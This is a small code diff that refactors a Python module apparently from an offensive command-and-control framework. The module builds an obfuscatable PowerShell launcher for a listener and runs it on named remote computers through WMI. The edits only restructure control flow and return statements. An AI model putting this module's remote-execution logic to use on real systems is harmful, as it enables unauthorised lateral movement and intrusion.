@@ -55,7 +55,7 @@ class Module:
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
 
-        elif listener_name:
+        if listener_name:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
                 listenerName=listener_name,
@@ -71,10 +71,8 @@ class Module:
 
             if launcher == "":
                 return handle_error_message("[!] Error generating launcher")
-            else:
-                stagerCode = (
-                    "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
-                )
+
+            stagerCode = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
 
         else:
             Cmd = command.replace('"', '`"').replace("$", "`$")
@@ -100,10 +98,9 @@ class Module:
 
         script += ";'Invoke-Wmi executed on " + computer_names + "'"
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end="",
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
